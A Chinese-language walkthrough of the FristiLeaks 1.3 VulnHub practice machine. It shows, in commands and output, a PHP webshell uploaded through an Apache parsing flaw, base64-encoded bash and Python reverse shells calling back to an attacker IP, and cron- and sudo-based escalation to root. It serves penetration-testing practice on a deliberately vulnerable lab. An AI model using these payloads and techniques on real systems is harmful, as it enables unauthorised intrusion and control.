[项目十六：FristiLeaks靶机渗透： - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/526244091)

[(158条消息) 靶机渗透FristiLeaks1.3 ☀️新手详细☀️_fristileaks_1.3_君莫hacker的博客-CSDN博客](https://blog.csdn.net/weixin_45744814/article/details/120168008)

# 信息搜集

1、端口扫描

```bash
└─# nmap -p- -sV -A 192.168.0.104
```

```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
| http-robots.txt: 3 disallowed entries 
|_/cola /sisi /beer
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Potentially risky methods: TRACE
MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13
Network Distance: 1 hop
```

2、对常用端口与服务进行枚举，这里没什么效果

```bash
└─# enum4linux 192.168.0.104
```

3、web上下文枚举

```bash
└─# gobuster dir -u http://192.168.0.104 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js,php.bak,txt.bak,html.bak,json,git,git.bak  
```

```bash
===============================================================
2023/06/19 23:58:56 Starting gobuster in directory enumeration mode
===============================================================
/.html.bak            (Status: 403) [Size: 211]
/.html                (Status: 403) [Size: 207]
/index.html           (Status: 200) [Size: 703]
/images               (Status: 301) [Size: 236] [--> http://192.168.0.104/images/]
/robots.txt           (Status: 200) [Size: 62]
/beer                 (Status: 301) [Size: 234] [--> http://192.168.0.104/beer/]
Progress: 208272 / 2426171 (8.58%)^C
```

4、观察 80 端口

主页如下

<img src=".\图片\Snipaste_2023-06-20_12-18-32.png" alt="Snipaste_2023-06-20_12-18-32" style="zoom:80%;" />

顺便记下页脚的一些用户名的东西

```bash
└─# cat users | tr ', ' '\n' | grep -v "^$"
@meneer
@barrebas
@rikvduijn
@wez3forsec
@PyroBatNL
@0xDUDE
@annejanbrouwer
@Sander2121
Reinierk
@DearCharles
@miamat
MisterXE
BasB
Dwight
Egeltje
@pdersjant
@tcp130x10
@spierenburg
@ielmatani
@renepieters
Mystery
guest
@EQ_uinix
@WhatSecurity
@mramsmeets
@Ar0xA
└─# cat users | tr ', ' '\n' | grep -v "^$" > username
```

robots.txt：

```
User-agent: *
Disallow: /cola
Disallow: /sisi
Disallow: /beer
```

5、猜测目录 /firsti

<img src=".\图片\Snipaste_2023-06-20_12-28-10.png" alt="Snipaste_2023-06-20_12-28-10" style="zoom:67%;" />

查看这里的源码，把 `eezeepz` 也加入到用户名字典里

<img src=".\图片\Snipaste_2023-06-20_12-44-37.png" alt="Snipaste_2023-06-20_12-44-37" style="zoom:67%;" />

# web打点

## 前台登录

1、测试注入，失败

2、另外可以用 kali  里 `strings` 命令查看一下图片的信息，这里没发现什么

3、查看登录框里的源码，发现图片是以 base64 形式展示的 `<img src="data:img/png;base64,` ，还找到了一个隐藏图片的 base64 编码

<img src=".\图片\Snipaste_2023-06-20_12-32-39.png" alt="Snipaste_2023-06-20_12-32-39" style="zoom:67%;" />

4、浏览器查看隐藏图片，火狐浏览器输入以上 base64code 即可， `data:img/png;base64,base64code`

<img src=".\图片\Snipaste_2023-06-20_12-35-58.png" alt="Snipaste_2023-06-20_12-35-58" style="zoom:50%;" />

好像可能是密码之类的

```
keKkeKKeKKeKkEkkEk
```

5、用之前收集的用户名列表和这里的密码，当做字典用 burp 跑跑 登录框

```
eezeepz:keKkeKKeKKeKkEkkEk
```

登录成功

## 后台上传

<img src=".\图片\Snipaste_2023-06-20_12-47-26.png" alt="Snipaste_2023-06-20_12-47-26" style="zoom:80%;" />

由于是 apache 服务器，这里可以尝试下解析漏洞，先传个图片马看看解析不解析

```
1）关于Apache的服务器是在Apache1.x，2.x 中Apache 解析文件的规则是从右到左开始判断解析, 如果后缀名为不可识别文件解析, 就再往左判断。
但是后端的centos是从左到右解析文件的。
举个例子：如果一个文件后缀是 1.php.jpg
那么apache从右到左认为他是图片，centos从左到右认为他是一个php。
这里造成了apache特有的解析漏洞。
```

图片马 backdoor.php：

```php
GIF89a
<?php
system($_GET['a']);
phpinfo();
?>
```

上传后可以执行命令

<img src=".\图片\Snipaste_2023-06-20_12-53-37.png" alt="Snipaste_2023-06-20_12-53-37" style="zoom:80%;" />

## 反弹shell技巧

get 请求里还可以 bash 执行用 base64 编码后的反弹shell

```bash
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTAzLzY2NjYgMD4mMQ== | base64 -d | bash
```

url编码后执行

```http
http://192.168.0.104/fristi/uploads/backdoor.php.gif?a=echo%20YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMTY4LjAuMTAzLzY2NjYgMD4mMQ%3D%3D%20%7C%20base64%20-d%20%7C%20bash
```

kali 监听 ， `rlwrap` 可以使用 nc 反弹shell 后 上翻下翻键。此时是 apache 用户

```bash
┌──(root💀kali)-[~/FristiLeaks]
└─# rlwrap nc -lvnp 6666                                                                                                                                127 ⨯
listening on [any] 6666 ...
connect to [192.168.0.103] from (UNKNOWN) [192.168.0.104] 42365
bash: no job control in this shell
bash-4.1$ uname -a
uname -a
Linux 192.168.0.104 2.6.32-573.8.1.el6.x86_64 #1 SMP Tue Nov 10 18:01:38 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
bash-4.1$ id
id
uid=48(apache) gid=48(apache) groups=48(apache)
```

python交互shell

```bash
python -c'import pty;pty.spawn("/bin/bash")'
```

# 提权

1、查看内核

```bash
bash-4.1$ uname -a
uname -a
Linux 192.168.0.104 2.6.32-573.8.1.el6.x86_64 #1 SMP Tue Nov 10 18:01:38 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux

bash-4.1$ cat /etc/*release*
cat /etc/*release*
CentOS release 6.7 (Final)
CentOS release 6.7 (Final)
CentOS release 6.7 (Final)
cpe:/o:centos:linux:6:GA
```

2、查看用户信息

```bash
bash-4.1$ cat /etc/passwd | grep -v nologin
cat /etc/passwd | grep -v nologin

root:x:0:0:root:/root:/bin/bash
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
vboxadd:x:498:1::/var/run/vboxadd:/bin/false
eezeepz:x:500:500::/home/eezeepz:/bin/bash
admin:x:501:501::/home/admin:/bin/bash
fristigod:x:502:502::/var/fristigod:/bin/bash
```

```bash
bash-4.1$ cat /home/eezeepz/notes.txt
cat /home/eezeepz/notes.txt
Yo EZ,

I made it possible for you to do some automated checks, 
but I did only allow you access to /usr/bin/* system binaries. I did
however copy a few extra often needed commands to my 
homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
from /home/admin/

Don't forget to specify the full path for each binary!

Just put a file called "runthis" in /tmp/, each line one command. The 
output goes to the file "cronresult" in /tmp/. It should 
run every minute with my account privileges.

- Jerry
```

```
我让你可以做一些自动检查，但我只允许您访问/usr/bin/*系统二进制文件。
然而，我确实复制了一些额外的经常需要的命令到我的homedir:chmod、df、cat、echo、ps、grep、egrep，这样您就可以使用它们了
来自/home/admin/
不要忘记为每个二进制文件指定完整路径！
只需在/tmp/中放入一个名为“runthis”的文件，每行一个命令。这个输出转到/tmp/中的文件“cronresult”。它应该以我的帐户权限每分钟运行一次。
```

根据提示我们可以看出，在/tmp/中放入一个名为“runthis”的文件，而这个文件就类似/etc/crontab文件，在这里是以admin用户**定时执行任务**，所以我们的思路是可以利用这个漏洞拿到admin用户的shell

## 步骤

### 提权到本地用户

3、编写反弹 shell 脚本，到 `/tmp/privilege.py`

```python
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("192.168.0.103",6688));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1); 
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
```

靶机下载

```bahs
bash-4.1$ wget http://192.168.0.103/privilege.py
```

4、向runthis中写入执行命令

方法一：写入反弹shell文件，即可拿到 admin 的 shell

```bash
echo '/usr/bin/python /tmp/privilege.py' > runthis
```

```bash
└─# nc -lvvp 6688                                                                                                                                         
listening on [any] 6688 ...
connect to [192.168.0.103] from 192.168.0.104 [192.168.0.104] 55277
sh: no job control in this shell
sh-4.1$ whoami
whoami
admin
```

方法二：将用户admin的家目录权限设置为所有用户均可访问

```bash
echo '/usr/bin/../../bin/chmod -R 777 /home/admin' > runthis
```

5、开启交互shell

```bash
sh-4.1$ python -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
[admin@192 ~]$ 
```

6、在用户admin家目录下发现加密代码，以及加密后的字符

```bash
[admin@192 ~]$ cd
cd

[admin@192 ~]$ ls
ls
cat    cronjob.py       cryptpass.py  echo   grep  whoisyourgodnow.txt
chmod  cryptedpass.txt  df            egrep  ps

[admin@192 ~]$ cat cryptedpass.txt
cat cryptedpass.txt
mVGZ3O3omkJLmy2pcuTq

[admin@192 ~]$ cat cryptpass.py
cat cryptpass.py
#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
import base64,codecs,sys

def encodeString(str):
    base64string= base64.b64encode(str)
    return codecs.encode(base64string[::-1], 'rot13')

cryptoResult=encodeString(sys.argv[1])
print cryptoResult
```

7、根据加密加密代码我们可以编写解密代码，然后解密

```bash
[admin@192 ~]$ cat whoisyourgodnow.txt
cat whoisyourgodnow.txt
=RFn0AKnlMHMPIzpyuTI0ITG
```

```python
#decoderot13.py
import base64,codecs,sys

def decodeString(str):
    base64string= codecs.decode(str,'rot13')
    return base64.b64decode(base64string[::-1])

cryptoResult=decodeString(sys.argv[1])
print (cryptoResult)
```

```bash
┌──(root💀kali)-[~/FristiLeaks]
└─# python decoderot13.py mVGZ3O3omkJLmy2pcuTq
b'thisisalsopw123'

┌──(root💀kali)-[~/FristiLeaks]
└─# python decoderot13.py =RFn0AKnlMHMPIzpyuTI0ITG                   
b'LetThereBeFristi!'
```

`LetThereBeFristi!`  可能就是 `fristigod` 用户的 密码

```bash
[admin@192 ~]$ ls /home
ls /home
admin  eezeepz  fristigod
```

```bash
[admin@192 ~]$ su fristigod
su fristigod
Password: LetThereBeFristi!

bash-4.1$ whoami
whoami
fristigod
```

### 提权到root

8、查看sudo可执行的文件，重点是 `/var/fristigod/.secret_admin_stuff/doCom`

```bash
bash-4.1$ sudo -l
sudo -l
[sudo] password for fristigod: LetThereBeFristi!

Matching Defaults entries for fristigod on this host:
    requiretty, !visiblepw, always_set_home, env_reset, env_keep="COLORS
    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1
    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User fristigod may run the following commands on this host:
    (fristi : ALL) /var/fristigod/.secret_admin_stuff/doCom
```

9、查看历史记录

查看历史可以发现使用这个可执行文件可以**以root身份执行命令**

```bash
bash-4.1$ history
history
    1  ls
    2  pwd
    3  ls -lah
    4  cd .secret_admin_stuff/
    5  ls
    6  ./doCom 
    7  ./doCom test
    8  sudo ls
    9  exit
   10  cd .secret_admin_stuff/
   11  ls
   12  ./doCom 
   13  sudo -u fristi ./doCom ls /
   14  sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
   15  exit
   16  sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
   17  sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
   18  exit
   19  sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
   20  exit
   21  sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
   22  sudo /var/fristigod/.secret_admin_stuff/doCom
   23  exit
   24  sudo /var/fristigod/.secret_admin_stuff/doCom
   25  sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
   26  exit
   27  sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
   28  exit
   29  sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
   30  groups
   31  ls -lah
   32  usermod -G fristigod fristi
   33  exit
   34  sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
   35  less /var/log/secure e
   36  Fexit
   37  exit
   38  exit
   39  whoami
   40  sudo -l
   41  history
```

10、提权到 root

```bash
bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash

sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash
bash-4.1# id
id
uid=0(root) gid=100(users) groups=100(users),502(fristigod)
```

```bash
bash-4.1# cd /root
cd /root

bash-4.1# ls
ls
fristileaks_secrets.txt

bash-4.1# cat fristileaks_secrets.txt
cat fristileaks_secrets.txt
Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]

I wonder if you beat it in the maximum 4 hours it's supposed to take!

Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)


Flag: Y0u_kn0w_y0u_l0ve_fr1st1

```

## 步骤二

就是还在 apache 权限时就可以**内核提权** ，脏牛梭哈 

# 总结

web打点中，容易忽视摆在眼前的重要信息，比如一些有含义的关键词、图片、源码、隐藏的url、用户名之类的等

可用二进制查看图片里存在的信息，比如kali工具strings

用管道符 | 或 grep 来从大量信息中筛选出重要的信息

用`find / -perm -u=s -type f 2>/dev/null` 的结果 和 网站 https://gtfobins.github.io/ 的結果  可以一起利用 python 自动化实现  筛选

history 命令可以查看当前用户的历史命令信息

简单密码学，从正向加密的算法，要会逆向出解密算法


